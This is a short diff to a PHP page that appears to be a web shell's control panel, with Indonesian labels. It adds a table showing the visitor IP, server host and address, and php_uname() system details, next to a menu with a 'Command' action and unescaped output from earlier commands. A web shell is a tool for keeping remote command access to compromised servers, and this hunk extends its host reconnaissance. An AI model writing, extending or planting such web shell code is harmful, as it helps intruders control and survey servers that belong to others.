@@ -65,6 +65,12 @@ body{font-family:'Orbitron',sans-serif;background-color:<?php echo $theme_bg;?>;
 if(isset($_GET['msg_text'])) { echo "<div class='message ".htmlspecialchars($_GET['msg_type'])."'>".htmlspecialchars($_GET['msg_text'])."</div>"; }
 if(isset($_SESSION['feature_output'])) { echo '<div class="section-box"><h3>Hasil Fitur Sebelumnya:</h3><pre>'.$_SESSION['feature_output'].'</pre></div>'; unset($_SESSION['feature_output']); }
 ?>
+<table class="system-info-table" width="95%" border="0" cellpadding="0" cellspacing="0" align="left">
+<tr><td>
+<font color='white'><i class='fa fa-user'></i> User / IP </font><td>: <font color='<?php echo $theme_fg; ?>'><?php echo $_SERVER['REMOTE_ADDR']; ?></font>
+<tr><td><font color='white'><i class='fa fa-desktop'></i> Host / Server </font><td>: <font color='<?php echo $theme_fg; ?>'><?php echo gethostbyname($_SERVER['HTTP_HOST'])." / ".$_SERVER['SERVER_NAME']; ?></font>
+<tr><td><font color='white'><i class='fa fa-hdd-o'></i> System </font><td>: <font color='<?php echo $theme_fg; ?>'><?php echo php_uname(); ?></font>
+</tr></td></table>
 <div class="main-menu">
     <div>
         <a href="?path=<?php echo urlencode($path); ?>&action=cmd">Command</a> |
